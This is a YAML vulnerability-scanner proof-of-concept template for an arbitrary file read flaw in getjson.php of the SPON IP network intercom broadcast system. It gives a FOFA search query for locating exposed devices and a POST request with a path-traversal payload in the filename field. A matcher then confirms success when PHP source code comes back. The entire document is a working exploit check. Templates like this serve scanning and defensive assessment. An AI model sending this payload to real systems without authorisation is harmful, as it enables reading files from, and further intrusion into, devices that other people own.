id: poc-yaml-spon-php-getjson-fileread
info:
  name: 世邦通信SPON IP网络对讲广播系统 getjson.php 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: IP网络对讲广播系统
  fofa: body="spon_base64.js" && body="login"
requests:
- method: POST
  path: /php/getjson.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: jsondata[filename]=../php/getjson.php
  expression: "status_code == 200 && \ncontains(body, \"<?php\") &&\ncontains(body,\
    \ \"$_POST\") &&\ncontains(body, \"\\\"data\\\"\") &&\ncontains(body, \"file_get_contents($fullpath)\"\
    )\n"
variables: {}
transport: http
